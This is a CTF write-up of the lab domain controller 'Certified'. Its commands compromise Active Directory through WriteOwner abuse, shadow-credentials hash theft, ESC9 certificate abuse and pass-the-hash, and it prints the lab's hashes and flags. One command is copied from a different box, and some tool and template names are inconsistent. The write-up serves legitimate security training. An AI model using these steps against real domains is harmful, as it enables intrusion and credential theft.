
## CTF Writeup: Certified

---
## Provided Credentials

```
judith.mader:judith09
```
## Reconnaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -n -Pn -sSCV -p- -oA nmap/certified 10.129.231.186                     
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-24 11:52 -0500
Nmap scan report for 10.129.231.186
Host is up (0.017s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-24 23:54:11Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-24T23:55:40+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2026-07-24T23:55:41+00:00; +6h59m59s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2026-07-24T23:55:40+00:00; +6h59m59s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2026-07-24T23:55:41+00:00; +6h59m59s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49718/tcp open  msrpc         Microsoft Windows RPC
49723/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-07-24T23:55:03
|_  start_date: N/A
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 202.35 seconds
```

The target seems to be an Domain Controller judging that DNS,LDAP & Kerberos seems to be active. The nmap scan reveals information about the underlying domain "certified.htb", SAN Name "DC01.certified.htb", and the hostname "DC01". Let's map this information to the target ip address in our local dns file.

```
echo "10.129.231.186 DC01.certified.htb certified.htb DC01" | tee -a /etc/hosts
```

I started of with checking if we can connect to the target system via evil-winrm.

```
nxc winrm certified.htb -u 'judith.mader' -p 'judith09'
```

Unfortunately not. I proceeded with enumerating domain users and found out that there is an interesting account called ca_operator. Which could hint to an internal CA being active!

I stored the output in an newusers.txt file in my local machine.

```
nxc smb certified.htb -u 'judith.mader' -p 'judith09' --rid-brute > newusers.txt
```

Formatted the list accordingly and 

```
grep "SidTypeUser" newusers.txt | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```

Enumerated SMB Shares, but couldn't find any non-default Shares or write permissions.

```
nxc smb certified.htb -u judith.mader -p 'judith09' --shares
```

Tried ASREP-Roasting, but none of the users had no PreAuth required.

```
impacket-GetNPUsers -dc-ip 10.129.231.186 certified.htb/ -no-pass -usersfile users.txt
```

Downloaded domain information using rusthound-ce.

```
rusthound-ce -d certified.htb -u judith.mader -p 'judith09' -i 10.129.231.186 -P 636
```

Started up my bloodhound and uploaded the domain information discovered by rusthound-ce.

```
neo4j console
bloodhound
```

Marked user "judith.mader" as owned and found out she has WriteOwner on the "Management" Group and can enroll in multiple Certificate Templates. She can also Enroll into the CA Directly.

Trying to enumerate if we can perform any ESC Attack was unsuccessful, atleast for now. No vulnerable template was identified.

```
certipy-ad find -u sql_svc -p 'REGGIE1234ronnie' -dc-ip 10.129.37.251 -target sequel.htb -vulnerable -enabled
```

Once we have initial access we will try & target the CA again with Certipy.exe, since certipy-ad remotely didn't provide any value. Let's try & abuse WriteOwner on the Management Group, because we identified that the Management Group has GenericWrite onto the management_svc domain user. Which means when we add our current user judith.mader to the Management Group we can get the NTLM Hash of the service account by performing an shadow credentials attack.

First, we abuse the WriteOwner ACL to get full control over the management group and add
ourselves to that group.

For this, we need to edit the ownership of the management group and set it to our judith.madner user. 

1. Utilize impacket-owneredit to modify the owner of the AD Object (Management Group)

```
impacket-owneredit -action write -new-owner judith.mader -target management certified/judith.mader:judith09 -dc-ip 10.129.231.186
```

2. Add rights to current user "judith.mader" to add users:

```
impacket-dacledit -action write -rights WriteMembers -principal judith.mader -target Management certified.htb/judith.mader:judith09 -dc-ip 10.129.231.186
```

3. Add judith.mader to the Management Group

```
net rpc group addmem Management judith.mader -U certified.htb/judith.mader%judith09 -S 10.129.231.186
```

4. Verify if user judith.mader is inside the Management Group now:

```
net rpc group members Management -U certified.htb/judith.mader%judith09 -S 10.129.231.186
```

Our user is judith.mader is now part of the Management Group and since this group as GenericWrite on the "management_svc" service account, we can abuse an shadow credentials attack which should grant us the NT Hash of the service account.

```
certipy-ad shadow auto -u 'judith.mader@certified.htb' -p 'judith09' -account management_svc -dc-ip 10.129.231.186
```

I had clock skew error, so I had to sync the time of my local machine to the time of the Domain Controller.

```
ntpdate -s certified.htb
```

Reran the initial shadow credentials attack and retrieved the NT Hash for the service account.

```
certipy-ad shadow auto -u 'judith.mader@certified.htb' -p 'judith09' -account management_svc -dc-ip 10.129.231.186
```

```
management_svc:a091c1832bcdd4677c28b5a6a1295584
```

Verified if we can login as management_svc service account via evil-winrm. We can!

```
nxc winrm certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
```

Connected to the DC via evil-wirnm.

```
evil-winrm -i certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
```

Retrieved user.txt in C:\Users\management_svc\Desktop.

```
b89e89d28cb10c567bfa951558da1025
```

## Privilege Escalation

I tried to enumerate a bit manually, but couldn't find anything. The user seems to be not part of a special group or has any permissions.

```
whoami /all
```

Decided to mark the user as owned in bloodhound and boom! He has GenericAll ACL over the "ca_operator" account!

We'll abuse another Shadow Credentials Attack on the ca_operator account.

```
certipy-ad shadow auto -u 'management_svc@certified.htb' -hashes :a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -dc-ip 10.129.231.186
```

Retrieved NT Hash of ca_operator.

```
ca_operator:b4b86f45c6018f1b664f70805f45d8f2
```

I checked if we can auth via winrm, but it wasn't possible.

```
nxc winrm certified.htb -u ca_operator -H b4b86f45c6018f1b664f70805f45d8f2
```

Marked this user as owned and checked his Outbound Object Controls. He can enroll in an special certificate template called "CertifiedAuthentication" which looks rather promising.

In order to enumerate further certificate template relationships which we could potentially utilize to PrivEsc, let's transfer Certipy.exe onto the target system:

1. Check which CA's are in place:

```
.\Certify.exe cas
```

2. Enumerate vulnerable certificates

```
.\Certify.exe find /vulnerable
```

This didn't provide much information which we didn't know yet & also said the same thing like certipy-ad that there seems to be no vulnerable template. Which is rather odd. Let's anyways still try & abuse the "CertificateAuthentication" Template.

ESC1 Attack didn't work! So I tried to enumerate vulnerable certificate templates & attacks again with the freshly discovered ca_operator user.

```
certipy-ad find -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.129.231.186 -target certified.htb -vulnerable -enabled
```

The Template "CertificateAuthentication" is vulnerable to an ESC9 Attack, which let's us modify the UPN (User Principal Name) of users.

The idea is to change the ca_operator user's UPN from ca_operator@certified.htb to
Administrator and then request the administrator.pfx and utilize it to retrieve the NTLM Hash of the Administrator User.

ESC9 requires three conditions:

- **StrongCertificateBindingEnforcement** not set to **2** (default: **1**) or **CertificateMappingMethods** contains **UPN** flag
- Certificate contains the **CT_FLAG_NO_SECURITY_EXTENSION** flag in the **msPKI-Enrollment-Flag** value
- Certificate specifies any client authentication EKU

1. Changed UPN of ca_operator to Administrator

```
certipy-ad account update -username management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator
```

2. Request a certificate with new UPN (Administrator)

```
certipy-ad req -username ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication
```

Gained administrator.pfx, now we can auth with this .pfx file and retrieve the NTLM Hash of the Administrator User.

3. But before that the ca_operator user's UPN must be changed to the original one.

```
certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb
```

4. After, authenticate to the DC with the administrator.pfx certificate.

```
certipy-ad auth -pfx administrator.pfx -domain certified.htb -dc-ip 10.129.231.186
```

Retrieved NTLM Hash of Administrator User & connected to the target using psexec.

```
impacket-psexec Administrator@DC01.certified.htb -hashes aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

Retrieved root.txt in C:\Users\Administrator\Desktop.

```
cfecc6ba8842480abf854d2c621cd9af
```